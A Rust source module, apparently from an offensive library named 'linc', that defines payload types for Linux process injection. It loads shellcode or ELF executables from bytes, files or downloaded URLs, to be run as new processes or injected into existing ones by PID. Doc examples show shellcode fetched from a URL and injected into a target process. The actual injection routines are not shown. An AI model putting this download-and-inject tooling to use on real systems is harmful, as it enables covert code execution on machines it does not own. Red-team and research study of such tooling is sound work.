//! Defines types and implementations for working with executable payloads.
//!
//! There are two types of payloads which:
//! - Create new processes (`Payload<New>`)
//! - Inject into existing processes (`Payload<Existing>`)
//!
//! # Examples
//!
//! Creating a new process:
//! ```no_run
//! use linc::payload::{New, Payload, PayloadType};
//!
//! let payload = Payload::<New>::from_file("/usr/bin/ls", PayloadType::Executable)
//!     .unwrap()
//!     .set_args("-l -a");
//! ```
//!
//! Injecting into an existing process:
//! ```no_run
//! use linc::payload::{Existing, Payload, PayloadType};
//!
//! let payload = Payload::<Existing>::from_file(
//!     "shellcode.bin",
//!     PayloadType::Shellcode,
//!     1234  // PID of target process
//! ).unwrap();
//! ```

use std::fs;

use nix::unistd::Pid;

use crate::error::Result;

// region:    --- Payload

/// Marker trait that defines valid process states.
/// Currently implemented by `New` and `Existing`.
pub trait ProcessState {}

/// State type representing payloads that create new processes.
/// Contains configuration for the new process.
pub struct New {
    name: String,
    args: String,
    target: String,
    target_args: String,
}

/// State type representing payloads that inject into existing processes.
/// Contains the target process identifier.
pub struct Existing {
    pid: Pid,
}

// Make sure that ProcessState can be either New or Existing
impl ProcessState for New {}
impl ProcessState for Existing {}

/// A payload that can be used for process injection or creation.
/// The type parameter `S` determines whether this payload creates a new process
/// or injects into an existing one.
///
/// # Type Parameters
///
/// * `S` - The process state, must implement `ProcessState`. Can be either `New` or `Existing`.
///
/// # Examples
///
/// Creating a new process payload:
/// ```no_run
/// use linc::payload::{New, Payload, PayloadType};
///
/// let payload = Payload::<New>::from_file("/usr/bin/ls", PayloadType::Executable)
///     .unwrap()
///     .set_args("-l -a");
/// ```
///
/// Creating an existing process payload:
/// ```no_run
/// use linc::payload::{Existing, Payload, PayloadType};
///
/// let payload = Payload::<Existing>::from_file(
///     "shellcode.bin",
///     PayloadType::Shellcode,
///     1234
/// ).unwrap();
/// ```
pub struct Payload<S: ProcessState> {
    payload_type: PayloadType,
    bytes: Vec<u8>,
    state: S,
}

/// Specifies the type of payload being used.
#[derive(Debug, Clone, Copy)]
pub enum PayloadType {
    Executable,
    Shellcode,
}

// Constructors
impl Payload<New> {
    /// Creates a new payload from a byte vector.
    ///
    /// The bytes can represent either a complete ELF executable or raw shellcode, as specified by
    /// the `payload_type` parameter.
    ///
    /// # Parameters
    ///
    /// * `bytes` - The raw bytes of the payload
    /// * `payload_type` - Specifies whether these bytes represent an executable or shellcode
    ///
    /// # Errors
    /// Currently infallible, but returns `Result` for consistency with other constructors.
    ///
    /// # Examples
    ///
    /// ```
    /// use linc::payload::{New, Payload, PayloadType};
    ///
    /// // Create a payload from shellcode bytes
    /// let shellcode = vec![0x90, 0x90, 0x90];  // NOP sled
    /// let payload = Payload::<New>::from_bytes(shellcode, PayloadType::Shellcode).unwrap();
    /// ```
    pub fn from_bytes(bytes: Vec<u8>, payload_type: PayloadType) -> Result<Self> {
        Ok(Self {
            payload_type,
            bytes,
            state: New {
                name: String::new(),
                args: String::new(),
                target: String::new(),
                target_args: String::new(),
            },
        })
    }

    /// Creates a new payload by reading from a file.
    ///
    /// The file can contain either a complete ELF executable or raw shellcode, as specified by
    /// the `payload_type` parameter.
    ///
    /// # Parameters
    ///
    /// * `path` - Path to the file containing the payload
    /// * `payload_type` - Specifies whether the file contains an executable or shellcode
    ///
    /// # Errors
    /// Returns an error if:
    /// - The file cannot be read
    /// - The file path contains invalid UTF-8 characters
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use linc::payload::{New, Payload, PayloadType};
    ///
    /// // Load a shellcode file
    /// let payload = Payload::<New>::from_file("shellcode.bin", PayloadType::Shellcode).unwrap();
    ///
    /// // Load an existing ELF executable
    /// let payload = Payload::<New>::from_file("/usr/bin/ls", PayloadType::Executable).unwrap();
    /// ```
    pub fn from_file(path: impl Into<String>, payload_type: PayloadType) -> Result<Self> {
        let path = path.into();

        Ok(Self {
            payload_type,
            bytes: fs::read(&path)?,
            state: New {
                name: path.split('/').last().unwrap_or("").to_string(),
                args: String::new(),
                target: String::new(),
                target_args: String::new(),
            },
        })
    }

    #[cfg(feature = "http")]
    /// Creates a new payload by downloading from a URL.
    ///
    /// The downloaded content can be either a complete ELF executable or raw shellcode, as specified by
    /// the `payload_type` parameter.
    ///
    /// # Parameters
    ///
    /// * `url` - URL to download the payload from
    /// * `payload_type` - Specifies whether the download contains an executable or shellcode
    ///
    /// # Errors
    /// Returns an error if:
    /// - The URL is invalid or unreachable
    /// - The network request fails
    /// - Reading the response body fails
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use linc::payload::{New, Payload, PayloadType};
    ///
    /// // Download and load an ELF executable
    /// let payload = Payload::<New>::from_url(
    ///     "http://example.com/executable",
    ///     PayloadType::Executable
    /// ).unwrap();
    ///
    /// // Download and load shellcode
    /// let payload = Payload::<New>::from_url(
    ///     "http://example.com/shellcode.bin",
    ///     PayloadType::Shellcode
    /// ).unwrap();
    /// ```
    pub fn from_url(url: impl Into<String>, payload_type: PayloadType) -> Result<Self> {
        let url = url.into();

        let response = ureq::get(&url).call()?;

        let mut payload_bytes: Vec<u8> = Vec::new();
        response.into_reader().read_to_end(&mut payload_bytes)?;

        Ok(Self {
            payload_type,
            bytes: payload_bytes,
            state: New {
                name: url.split('/').last().unwrap_or("").to_string(),
                args: String::new(),
                target: String::new(),
                target_args: String::new(),
            },
        })
    }
}

impl Payload<Existing> {
    /// Creates a new payload for injection into an existing process.
    ///
    /// # Parameters
    ///
    /// * `bytes` - The raw bytes of the payload
    /// * `payload_type` - Specifies whether these bytes represent an executable or shellcode
    /// * `pid` - Process ID of the target process
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use linc::payload::{Existing, Payload, PayloadType};
    ///
    /// let payload = Payload::<Existing>::from_bytes(
    ///     vec![0x90, 0x90, 0x90],
    ///     PayloadType::Shellcode,
    ///     1234
    /// ).unwrap();
    /// ```
    pub fn from_bytes(bytes: Vec<u8>, payload_type: PayloadType, pid: i32) -> Result<Self> {
        Ok(Self {
            payload_type,
            bytes,
            state: Existing {
                pid: Pid::from_raw(pid),
            },
        })
    }

    /// Creates a new payload by reading from a file.
    ///
    /// The file can contain either a complete ELF executable or raw shellcode, as specified by
    /// the `payload_type` parameter.
    ///
    /// # Parameters
    ///
    /// * `path` - Path to the file containing the payload
    /// * `payload_type` - Specifies whether the file contains an executable or shellcode
    /// * `pid` - Process ID of the target process
    ///
    /// # Errors
    /// Returns an error if:
    /// - The file cannot be read
    /// - The file path contains invalid UTF-8 characters
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use linc::payload::{Existing, Payload, PayloadType};
    ///
    /// let payload = Payload::<Existing>::from_file(
    ///     "shellcode.bin",
    ///     PayloadType::Shellcode,
    ///     1234
    /// ).unwrap();
    /// ```
    pub fn from_file(path: impl Into<String>, payload_type: PayloadType, pid: i32) -> Result<Self> {
        let path = path.into();

        Ok(Self {
            payload_type,
            bytes: fs::read(&path)?,
            state: Existing {
                pid: Pid::from_raw(pid),
            },
        })
    }

    /// Creates a new payload by downloading from a URL.
    ///
    /// The downloaded content can be either a complete ELF executable or raw shellcode, as specified by
    /// the `payload_type` parameter.
    ///
    /// # Parameters
    ///
    /// * `url` - URL to download the payload from
    /// * `payload_type` - Specifies whether the download contains an executable or shellcode
    /// * `pid` - Process ID of the target process
    ///
    /// # Errors
    /// Returns an error if:
    /// - The URL is invalid or unreachable
    /// - The network request fails
    /// - Reading the response body fails
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use linc::payload::{Existing, Payload, PayloadType};
    ///
    /// let payload = Payload::<Existing>::from_url(
    ///     "http://example.com/shellcode.bin",
    ///     PayloadType::Shellcode,
    ///     1234
    /// ).unwrap();
    /// ```
    #[cfg(feature = "http")]
    pub fn from_url(url: impl Into<String>, payload_type: PayloadType, pid: i32) -> Result<Self> {
        let url = url.into();

        let response = ureq::get(&url).call()?;

        let mut payload_bytes: Vec<u8> = Vec::new();
        response.into_reader().read_to_end(&mut payload_bytes)?;

        Ok(Self {
            payload_type,
            bytes: payload_bytes,
            state: Existing {
                pid: Pid::from_raw(pid),
            },
        })
    }
}

// Common getters for all states
impl<S: ProcessState> Payload<S> {
    /// Returns the type of this payload.
    pub fn payload_type(&self) -> PayloadType {
        self.payload_type
    }

    /// Returns the payload's raw bytes.
    pub fn bytes(&self) -> &[u8] {
        &self.bytes
    }
}

// Variant-specific getters
impl Payload<New> {
    /// Returns the name of the payload.
    pub fn name(&self) -> &str {
        &self.state.name
    }

    /// Returns the arguments that will be passed to the payload when executed.
    pub fn args(&self) -> &str {
        &self.state.args
    }

    /// Returns the target executable.
    pub fn target(&self) -> &str {
        &self.state.target
    }

    /// Returns the arguments that will be passed to the target executable.
    pub fn target_args(&self) -> &str {
        &self.state.target_args
    }
}

impl Payload<Existing> {
    /// Returns the process ID that this payload will be injected into.
    pub fn pid(&self) -> Pid {
        self.state.pid
    }
}

// Chainable setters
impl Payload<New> {
    /// Sets the arguments for this payload.
    pub fn set_args(mut self, args: &str) -> Self {
        self.state.args = self.state.name.clone() + " " + args;
        self
    }

    /// Sets the target for this payload.
    pub fn set_target(mut self, target: &str) -> Self {
        self.state.target = target.to_string();
        self
    }

    /// Sets the target arguments for this payload.
    pub fn set_target_args(mut self, target_args: &str) -> Self {
        self.state.target_args = self.state.target.clone() + " " + target_args;
        self
    }
}

/// Extension trait for `Result<Payload>` that provides chainable configuration methods.
///
/// This trait allows for payload configuration even when the payload creation
/// might fail. It provides the same configuration methods as `Payload` but works on
/// `Result<Payload>` directly, making it easier to chain operations without explicit
/// error handling.
pub trait PayloadResultExt {
    /// Sets the arguments for the payload.
    ///
    /// # Errors
    /// Returns the original error if the payload creation failed.
    fn set_args(self, args: &str) -> Result<Payload<New>>;

    /// Sets the target executable for the payload.
    ///
    /// # Errors
    /// Returns the original error if the payload creation failed.
    fn set_target(self, target: &str) -> Result<Payload<New>>;

    /// Sets the target executable's arguments for the payload.
    ///
    /// # Errors
    /// Returns the original error if the payload creation failed.
    fn set_target_args(self, target_args: &str) -> Result<Payload<New>>;
}

impl PayloadResultExt for Result<Payload<New>> {
    fn set_args(self, args: &str) -> Result<Payload<New>> {
        self.map(|payload| payload.set_args(args))
    }

    fn set_target(self, target: &str) -> Result<Payload<New>> {
        self.map(|payload| payload.set_target(target))
    }

    fn set_target_args(self, target_args: &str) -> Result<Payload<New>> {
        self.map(|payload| payload.set_target_args(target_args))
    }
}

// endregion: --- Payload
